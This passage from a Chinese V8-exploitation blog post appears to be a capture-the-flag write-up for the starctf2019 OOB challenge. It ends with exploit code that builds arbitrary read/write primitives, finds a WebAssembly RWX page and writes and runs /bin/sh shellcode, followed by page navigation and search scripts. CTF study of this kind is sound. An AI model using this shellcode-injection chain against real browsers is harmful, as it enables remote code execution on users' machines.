class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">let</span> wasm_instance_addr = getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">f();</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221941594.png" alt="image-20220322194115446"></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2019/tree/master/pwn-OOB" >starctf2019/pwn-OOB at master · sixstars/starctf2019 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/03/01/V8%E4%BB%8E0%E5%BC%80%E5%A7%8B/">http://pig-007.github.io/2022/03/01/V8%E4%BB%8E0%E5%BC%80%E5%A7%8B/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/V8/">V8</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/03/07/arp_spoof/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">arp_spoof</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/02/10/PHP_PWN/"><span class="paginator-prev__text">PHP_PWN</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">
+          一、环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE"><span class="toc-text">
+          1.代理设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD"><span class="toc-text">
+          2.代码下载</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
+          二、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%B0%83%E8%AF%95%E7%9F%A5%E8%AF%86"><span class="toc-text">
+          1.调试知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B7%A5%E5%85%B7"><span class="toc-text">
+          (1)工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0"><span class="toc-text">
+          (2)函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">
+          2.基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%B9%E8%B1%A1%E5%86%85%E5%AD%98%E8%AE%B2%E8%A7%A3"><span class="toc-text">
+          (1)对象内存讲解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8D%E5%90%8C%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83"><span class="toc-text">
+          (2)不同对象类型内存分布</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E6%95%B0%E7%BB%84%E5%AF%B9%E8%B1%A1"><span class="toc-text">
+          ①数组对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%AF%B9%E8%B1%A1%E6%95%B0%E7%BB%84%E5%AF%B9%E8%B1%A1"><span class="toc-text">
+          ②对象数组对象</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86"><span class="toc-text">
+          (3)类型混淆</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%99%85%E9%A2%98%E7%9B%AE"><span class="toc-text">
+          三、实际题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">
+          1.题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">
+          2.漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9E%84%E9%80%A0%E8%BD%AC%E5%8C%96%E5%87%BD%E6%95%B0"><span class="toc-text">
+          (1)构造转化函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E8%BD%AC%E5%8C%96%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99"><span class="toc-text">
+          (2)利用转化函数构造任意读写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">
+          原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-text">
+          代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-text">
+          测试效果：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-text">
+          3.实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%84%E5%A0%86%E6%80%9D%E8%B7%AF"><span class="toc-text">
+          (1)常规堆思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8WASM%E6%9C%BA%E5%88%B6"><span class="toc-text">
+          (2)利用WASM机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          ①泄露地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%86%99%E5%85%A5shellcode%E5%88%B0wasm%E7%9A%84rwx%E6%AE%B5"><span class="toc-text">
+          ②写入shellcode到wasm的rwx段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E8%B0%83%E7%94%A8wasm%E6%9D%A5%E6%89%A7%E8%A1%8Cshellcode"><span class="toc-text">
+          ③调用wasm来执行shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-text">
+          EXP:</span></a></li></ol></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">118</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">62</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">60</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
